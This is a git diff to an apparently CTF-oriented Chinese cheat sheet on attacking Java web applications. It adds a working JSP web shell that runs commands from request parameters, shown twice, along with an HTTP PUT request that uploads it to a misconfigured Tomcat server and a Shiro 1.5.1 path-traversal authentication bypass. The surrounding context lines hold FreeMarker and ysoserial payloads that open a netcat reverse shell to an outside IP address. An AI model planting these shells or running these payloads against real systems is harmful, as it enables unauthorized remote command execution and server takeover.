@@ -3385,6 +3385,37 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin
 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec
 ```
 
+#### JSP 模板注入
+
+##### JSP 一句话木马(tomcat)
+
+```jsp
+<%
+        if("cmd".equals(request.getParameter("pwd"))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("<pre>");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print("</pre>");
+    }
+%>
+```
+
+然后访问 `1.jsp`，GET 参数如下即可利用
+
+```
+?pwd=cmd&i=ls
+```
+
+如 (Java 中貌似不支持 `cat /f*`)
+
+```
+?pwd=cmd&i=cat /flag
+```
+
 #### Velocity 模板注入
 
 - 注入的时候记得 urlencode
@@ -3409,7 +3440,7 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --e
 /hello?name=<#assign value="freemarker.template.utility.Execute"?new()>${value("nc 144.34.181.239 10008 -e /bin/sh")}
 ```
 
-#### ysoserial
+#### ysoserial 反序列化
 
 - 推荐使用 shell 反弹，因为靶机中未必有 wget 或 curl，不一定能数据外带
 - 打的时候记得 urlencode
@@ -3433,6 +3464,56 @@ java -jar ysoserial.jar CommonsCollections2 "nc 144.34.181.239 10008 -e /bin/sh 
 ```
 
 `CommonsCollections6` 这里可以自己试，输入 `java -jar ysoserial-all.jar` 查看所有 Payload
+
+#### 其他漏洞
+
+##### vulhub/shiro:1.5.1
+
+直接请求管理页面`/admin/`，无法访问，将会被重定向到登录页面
+
+构造恶意请求`/xxx/..;/admin/`，即可绕过权限校验，访问到管理页面
+
+##### tomcat 配置错误
+
+tomcat 配置错误可能导致 PUT 方法文件上传漏洞
+
+使用 PUT 方法上传 `jsp` 木马即可 (下面是 Burp 的模版)
+
+```jsp
+PUT /1.jsp/ HTTP/1.1
+Host: 192.168.18.209:8080
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36
+
+<%
+        if("cmd".equals(request.getParameter("pwd"))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("<pre>");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print("</pre>");
+    }
+%>
+```
+
+然后访问 `1.jsp`，GET 参数如下即可利用
+
+```
+?pwd=cmd&i=ls
+```
+
+如 (Java 中貌似不支持 `cat /f*`)
+
+```
+?pwd=cmd&i=cat /flag
+```
 
 #### Java 理论
 
